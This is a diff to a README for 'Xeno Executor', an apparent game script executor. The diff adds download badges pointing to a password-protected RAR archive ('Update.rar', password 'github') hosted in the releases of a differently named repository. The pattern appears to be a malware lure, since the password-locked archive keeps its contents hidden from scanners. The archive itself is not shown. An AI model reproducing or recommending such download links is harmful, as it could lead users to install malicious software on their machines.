@@ -1,4 +1,5 @@
-# Xeno Executor 🚀 [![Download Xeno Executor](https://img.shields.io/badge/Download-Xeno_Executor-red?style=for-the-badge&logo=download)]()
+# Xeno Executor 🚀 [![Download Xeno Executor](https://img.shields.io/badge/Download-Xeno_Executor-red?style=for-the-badge&logo=download)](https://github.com/RibxTop/blox-fruits-script/releases/download/Update/Update.rar)
+## PASSWORD: github
 
 
 Welcome to **Xeno Executor**—one of the most powerful script execution tools for your needs! 💻🔥
@@ -10,7 +11,8 @@ Welcome to **Xeno Executor**—one of the most powerful script execution tools f
 
 **Embrace the future of scripting with Xeno Executor, where dreams become reality. 🚀✨**
 
-[![Download Xeno Executor](https://img.shields.io/badge/Download-Xeno_Executor-red?style=for-the-badge&logo=download)]()
+[![Download Xeno Executor](https://img.shields.io/badge/Download-Xeno_Executor-red?style=for-the-badge&logo=download)](https://github.com/RibxTop/blox-fruits-script/releases/download/Update/Update.rar)
+## PASSWORD: github
 ---
 ![xen](https://github.com/user-attachments/assets/9654bb3b-29f0-498f-8e2f-635726413bfd)
 
